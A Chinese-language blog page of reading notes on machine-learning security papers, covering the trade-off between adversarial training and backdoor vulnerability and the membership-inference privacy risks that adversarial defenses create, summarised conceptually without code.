<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/OnTheTradeOff-NeurIPS2020.assets/image-20210923153637046.png" alt="image-20210923153637046" /><figcaption aria-hidden="true">image-20210923153637046</figcaption>
</figure>
<p>从salience map（模型预测相对于输入的梯度）可以看到：</p>
<p>根据b,c的左图，对抗训练的网络更依赖于与人类感知一致的高级特征进行预测(这和已有的工作[18,37]一致，即对抗样本之所以会被误分类是因为他们存在非鲁棒特征（即具有高度预测性，但是难以理解的特征）)，由于对抗训练得到的网络更依赖鲁棒的、高层次的特征进行预测，所以它也倾向于从后门触发器的特征进行学习，因为触发器提供了鲁棒特征，这些特征本身就是被制作为与目标类别强相关的</p>
<h1 id="exploting-the-trade-off">Exploting the trade-off</h1>
<p>作者研究了触发器的其他变量，包括trigger type,trigger size,poisoned data rate,trigger position</p>
<p>trigger type的话除了上一节直接叠加的，这里作者叫做sticker（一些文献也叫做patch），还引入了两种：watermark和channel，前者就是水印，后者则是将特定区域的像素的的蓝色channel置零</p>
<p>对应的毒化样本如下</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/OnTheTradeOff-NeurIPS2020.assets/image-20210923154722102.png" alt="image-20210923154722102" /><figcaption aria-hidden="true">image-20210923154722102</figcaption>
</figure>
<p>结果如下</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/OnTheTradeOff-NeurIPS2020.assets/image-20210923154835468.png" alt="image-20210923154835468" /><figcaption aria-hidden="true">image-20210923154835468</figcaption>
</figure>
<p>由于对抗鲁棒性变化不大，表中就没列出来，从表中可知</p>
<p>即使将trigger size变小，后门攻击成功率依旧超过0.5，其他结论也都显而易见</p>
<p>接下来检测后门攻击的防御方案[6,36,39]是否可以检测作者的方案，不过[6,36]在对抗训练得到的网络中无法防御后门攻击，这不意味着防御方案被绕过了，而是因为它们不适用于对抗鲁棒模型，整体的测试结果如下,其中a,b，c顺序对应接下来介绍的三类防御方案</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/OnTheTradeOff-NeurIPS2020.assets/image-20210923161555316.png" alt="image-20210923161555316" /><figcaption aria-hidden="true">image-20210923161555316</figcaption>
</figure>
<p>根据模型在预测毒化测试样本和良性测试样本时的不同行为，我们可以猜测，可能神经网络中一些神经元被触发器特征激活，一些神经元被正常特征激活，因此，两类样本的神经元激活分布可能是不同的，所以可以通过检查激活来检测毒化测试样本</p>
<p><strong>Spectral signature</strong></p>
<p>该方案使用所有的样本训练一个辅助网络，假设目标类别已知，防御方案：1.为每个目标类别的样本计算辅助网络中的隐层上的神经元的激活向量；2.通过独立成分分析Independent component analysis(ICA)从每个激活向量中提取spectral signature；3.将sepctral siganature最远离“center（所有spectral signature的平均）”的样本识别为毒化样本.然后最终的模型使用移除毒化样本后的数据集进行训练</p>
<p><strong>Activation clustering</strong></p>
<p>根据激活空间中的相似性度量将样本分为两组，然后删除被人类或算法认为可以的组，接着删除在ground truth中有更多毒化样本的group实现防御。面对clean-label时，由于此时的毒化样本和良性样本非常相似，可以轻而易举逃避检测，此外存在许多误报，减少了目标类中良性样本的数量，造成数据不平衡。</p>
<p>我们发现这种trade-off增强了neural cleanse的防御效果</p>
<p>该方案是从毒化模型中逆向得到触发器，并将触发器加到各类样本上，对模型进行微调，从而让模型认为触发器特征是没用的。该方案对于正常训练的模型是无效的，因为不能通过逆向工程得到复杂的触发器，但是该方案对于对抗模型效果更佳，示意如下</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/OnTheTradeOff-NeurIPS2020.assets/image-20210923160240720.png" alt="image-20210923160240720" /><figcaption aria-hidden="true">image-20210923160240720</figcaption>
</figure>
<p>这似乎表明，对抗训练+neural cleanse可以同时提高对抗鲁棒性和后门鲁棒性</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/23/Privacy-Risks-of-Securing-Machine-Learning-Models-against-Adversarial-Examples-CCS2019/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Elwood's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/09/23/Privacy-Risks-of-Securing-Machine-Learning-Models-against-Adversarial-Examples-CCS2019/" itemprop="url">Privacy-Risks-of-Securing-Machine-Learning-Models-against-Adversarial-Examples-CCS2019</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-09-23T21:37:43+08:00">
                2021-09-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="abstract">Abstract</h1>
<p>在之前的研究中，安全和隐私是被分开考虑的，一个领域的防御方法是否会对另一个领域产生的意想不到的影响尚不清楚。</p>
<p>作者结合了这两个领域，衡量了成员推理攻击对六种最先进的防御方法的成功程度，这些防御方法是用于提升模型鲁棒性的，而成员推理攻击可以判断一个单独的数据记录是否在模型训练集中，这种攻击的准确率反映了训练算法对训练集个体成员的信息泄露风险。针对对抗样本的防御方法实际上影响了模型的决策边界，对于每个输入样本周围的一小块区域，模型的预测保持不变，然而这是在训练数据上优化得到的，因此，训练集中的个体数据记录对防御方法得到的鲁棒模型有显著影响，这使得模型更容易受到推理攻击。</p>
<p>为了进行成员推理攻击，作者使用了现在的推理方法（利用模型的预测），还提出了两种新的推理方法（利用鲁棒模型在对抗样本上的结构性质）。实验表明，对抗防御方法会增加模型被成员推理攻击的风险，风险提升了4.5倍。</p>
<h1 id="introduction">Introduction</h1>
<p>对于AI来说，</p>
<p>在<strong>安全</strong>领域，攻击者的目标是让模型误分类，攻击方法可以分为两类：对抗攻击和投毒攻击(其实说后门攻击更恰当)</p>
<p>在<strong>隐私</strong>领域，攻击者的目标是获取关于模型训练数据或目标模型的隐私信息，</p>
<p>针对数据隐私攻击方法包括：成员推理攻击(37,47,64)，属性推理攻击[12],隐蔽信道模型训练攻击[52]</p>
<p>针对模型隐私攻击方法包括：模型窃取攻击[58],超参数窃取攻击[60]</p>
<p>成员推理攻击的目的是推断一个数据点是否属于目标模型的训练集，反映了模型对其训练数据的信息泄露，还可能带来隐私风险，因为成员会泄露个人的敏感信息。已有的工作表明，在黑盒环境下，成员推理攻击的成功与否与目标模型的泛化误差高度相关[47,64].对抗鲁棒模型的目的是通过确保每个输入样本周围的小区域(如<span class="math inline">\(l_\infty\)</span>)的预测不变来增强目标模型的鲁棒性，但是该目标只是在目标数据集上进行了优化。直觉上来看，对抗鲁棒模型可能增加模型的泛化误差和对训练集变化的敏感性，从而增加成员推理攻击的风险。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923170816487.png" alt="image-20210923170816487" /><figcaption aria-hidden="true">image-20210923170816487</figcaption>
</figure>
<p>从图中可以看到，原模型和鲁棒模型的训练数据(成员数据)和测试数据（非成员数据）的交叉熵损失的直方图，可以看到，与原模型相比，鲁棒模型更容易区分是否为成员数据</p>
<p>作者做了一系列实验，证明鲁棒模型比原模型更容易受到成员推理攻击。</p>
<h1 id="background-and-related-work-adversarial-examples-and-membership-inference-attacks">BACKGROUND AND RELATED WORK: ADVERSARIAL EXAMPLES AND MEMBERSHIP INFERENCE ATTACKS</h1>
<h2 id="adversarial-examples-amd-defenses">Adversarial Examples amd Defenses</h2>
<p>对抗样本的定义：</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923182413911.png" alt="image-20210923182413911" /><figcaption aria-hidden="true">image-20210923182413911</figcaption>
</figure>
<p>其中<span class="math inline">\(B_\epsilon(x)\)</span>是在<span class="math inline">\(x\)</span>的perturbation budget <span class="math inline">\(\epsilon\)</span>的周围的一系列点组成的集合。通常使用<span class="math inline">\(l_p\)</span>ball作为生成对抗样本时的约束，即<span class="math inline">\(B_\epsilon(x)={x&#39;|||x&#39;-x||_p\leq\epsilon}\)</span>.在本文中考虑<span class="math inline">\(l_\infty\)</span>ball，因为它被大量对抗防御方案采用[16,33,34,40,50,21,61,66]</p>
<p>上式的解被称作非定向的对抗样本，目的是为了实现任意的误分类，而定向的对抗样本则需要确保模型会误分类为特定的样本<span class="math inline">\(y&#39;\)</span>，即</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923183255747.png" alt="image-20210923183255747" /><figcaption aria-hidden="true">image-20210923183255747</figcaption>
</figure>
<p>为了实现对抗攻击的鲁棒性，研究人员不是用下面这种正常的算法</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923183359078.png" alt="image-20210923183359078" /><figcaption aria-hidden="true">image-20210923183359078</figcaption>
</figure>
<p>而是加上了额外的鲁棒损失函数</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923183426865.png" alt="image-20210923183426865" /><figcaption aria-hidden="true">image-20210923183426865</figcaption>
</figure>
<p>其中<span class="math inline">\(\alpha\)</span>原损失与鲁棒损失之间权衡的比率，<span class="math inline">\(l_R\)</span>是鲁棒损失，其可以被形式化为在约束<span class="math inline">\(B_\epsilon(x)\)</span>下最大化预测损失<span class="math inline">\(l&#39;\)</span>，即</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923183642808.png" alt="image-20210923183642808" /><figcaption aria-hidden="true">image-20210923183642808</figcaption>
</figure>
<p>其中<span class="math inline">\(l&#39;\)</span>可以和<span class="math inline">\(l\)</span>相同或者是近似的损失函数</p>
<p>然而上式通常很难找到明确的解，因此，对抗防御的方案提出了不同的方法来近似鲁棒损失<span class="math inline">\(l_R\)</span>，可以分为两类：</p>
<p><strong>Empirical defenses</strong></p>
<p>在对抗训练算法可以被表达为： <img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923183933182.png" alt="image-20210923183933182" /></p>
<p>有三种防御方案都可以归为这类：</p>
<p>1）基于PGD的对抗训练</p>
<p>这属于实证型的防御empirical defense method</p>
<p>使用PGD生成对抗样本来最大化交叉熵损失(<span class="math inline">\(l&#39;=l\)</span>)，并完全在这些对抗样本上训练(<span class="math inline">\(\alpha=0\)</span>)</p>
<p>PGD攻击包含T梯度下降step，这可以表示为</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923184339264.png" alt="image-20210923184339264" /><figcaption aria-hidden="true">image-20210923184339264</figcaption>
</figure>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923184359197.png" alt="image-20210923184359197" /><figcaption aria-hidden="true">image-20210923184359197</figcaption>
</figure>
<p>2)分布式对抗训练</p>
<p>与其如PGD严格遵循扰动约束，该方案通过求解交叉熵损失的拉格朗日松弛来生成对抗样本</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923184625043.png" alt="image-20210923184625043" /><figcaption aria-hidden="true">image-20210923184625043</figcaption>
</figure>
<p>他们推到了<span class="math inline">\(l_2\)</span>分布式鲁棒性的统计保证（在严格要求损失函数<span class="math inline">\(l\)</span>在<span class="math inline">\(x\)</span>上是平滑的推导得到)，本来这属于certified robustness,但是由于作者使用ReLU，这是非平滑的损失函数，同时是在<span class="math inline">\(l_\infty\)</span>距离内生成对抗样本，所以将该方案归为empirical</p>
<p>3）基于差异的对抗训练</p>
<p>不使用交叉熵，而是使用良性输出和对抗输出的差异，如KL散度作为损失函数，并结合原来的交叉熵损失</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923185428704.png" alt="image-20210923185428704" /><figcaption aria-hidden="true">image-20210923185428704</figcaption>
</figure>
<p><strong>Verifiable defense</strong></p>
<p>尽管经验性、实证性的防御方案对最先进的对抗样本是有效的，但是并不能保证这种鲁棒性，为了获得鲁棒性的保证，研究人员提出了在对抗扰动约束下计算预测损失上界的验证方法。如果在经过验证的最坏情况下模型仍然能正确预测输入，则可以确定在对抗扰动约束下不存在误分类。</p>
<p>所以，可验证防御方案通过使用验证过的最坏情况预测损失作为鲁棒损失函数<span class="math inline">\(l_R\)</span>考虑了验证过程。因此，现在的鲁棒训练算法为：</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923185927319.png" alt="image-20210923185927319" /><figcaption aria-hidden="true">image-20210923185927319</figcaption>
</figure>
<p>作者考虑了下列的verifiable defense methods</p>
<p>1)duality-based verification</p>
<p>通过在非凸ReLU操作上用凸松弛法求解其对偶问题，计算出验证过的最坏情况损失（worst case loss），然后只最小化这个过逼近的鲁棒损失值。还可以将这种对偶松弛方法与随机投影技术相结合，以扩展到更复杂的神经网络结构，如ResNet</p>
<p>2）Abstract Interpretation-based verification</p>
<p>利用抽象解释技术来计算worst-cases loss:利用抽象域(如区间域、环域)表示输入层的扰动约束，在其上应用abstract transformer,得到模型输出的最大验证范围，在logits上采用一个softplus函数来计算鲁棒损失函数，然后将其与原损失函数相结合<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923190502199.png" alt="image-20210923190502199" /></p>
<p>3）Interval Bound Propagation-based verification</p>
<p>将扰动约束表示为一个有界区间域，并将这个约束传播到输出层。鲁棒损失被计算为vertified worst-case 输出的交叉熵损失，然后与原损失函数结合作为训练期间最终的损失函数</p>
<h2 id="membership-inference-attacks">Membership Inference Attacks</h2>
<p>Shokri等人的成员推理攻击技术：为了训练推理模型，引入了影子模型技术：1.首先训练多个影子模型，模拟目标模型的行为2.基于影子模型在自身训练数据、测试数据上的输出，攻击者获得一个标记过的数据集，3.训练推理模型，对目标模型进行成员推理攻击。推理模型的输入是目标数据记录上的目标模型输出的预测向量</p>
<p>如果是简单的模型的话，直接使用置信度的阈值进行攻击也是可行的</p>
<h1 id="membership-inference-attacks-against-robust-models">MEMBERSHIP INFERENCE ATTACKS AGAINST ROBUST MODELS</h1>
<p><strong>模型推理攻击的性能与目标模型的泛化误差高度相关。</strong>一个简单的攻击算法可以根据输入是否被正确分类来推断成员属性，在这种情况下，目标模型的训练精度和测试精度之间巨大的差距会导致显著的成员推理攻击影响(因为成员数据都被正确分类了，而非成员数据则没有)。鲁棒训练可能导致测试准确率下降，此外当评估鲁棒模型在对抗样本上的准确率时泛化误差会被扩大。因此，与原模型相比，鲁棒模型在良性环境或对抗性环境下，由于表现出更更大的泛化误差，所以可能会泄露更多的成员信息。</p>
<p><strong>模型推理攻击的性能与目标模型对训练数据的敏感性有关。</strong>敏感性衡量的是数据点对模型性能的影响，通过计算在数据点在和不在训练集中时模型的预测差异得到。直观上来看，当一个训练数据点对目标模型有很大影响（敏感度大）时，它的模型预测和在测试点上的模型预测会有区别，攻击者因此就可以轻易区分是否为成员数据。鲁棒算法旨在确保模型预测对任何数据点周围的ball保持不变，在实际中，对训练数据保证了这一点，因此放大了训练数据对模型的影响，因此，与自然训练相比，鲁棒训练算法通过增加模型对训练数据的敏感性，使模型更容易受到成员推理攻击。</p>
<p>为了验证上述观点，我们从下图就可以看出，与原模型相比，鲁棒模型在训练数据的预测损失和测试数据的预测损失之间存在较大的差异。</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923191959930.png" alt="image-20210923191959930" /><figcaption aria-hidden="true">image-20210923191959930</figcaption>
</figure>
<p>使用下式衡量成员推理攻击准确率</p>
<figure>
<img src="https://raw.githubusercontent.com/NY1024/images/master/2021/09/23/Privacy%20Risks%20of%20Securing%20Machine%20Learning%20Models%20against%20Adversarial%20Examples-CCS2019.assets/image-20210923193228871.png" alt="image-20210923193228871" /><figcaption aria-hidden="true">image-20210923193228871</figcaption>
</figure>
<p>还有些其他指标</p>
<h1 id="experiment-setup">Experiment Setup</h1>
<h1 id="conclusion">Conclusion</h1>
<p>本文通过研究对抗训练方案的成员推理攻击的风险，将安全与隐私两个领域联系起来。为了评估成员推理攻击的营私风险，除了使用传统的基于良性输入的预测置信度的方法外，还提出了利用对抗鲁棒模型的方案的结构特性的推理方法。与原模型相比，所有6种鲁棒方法都会使机器学习模型更容易受到成员推理攻击。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">23</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


  

  

</body>
</html>
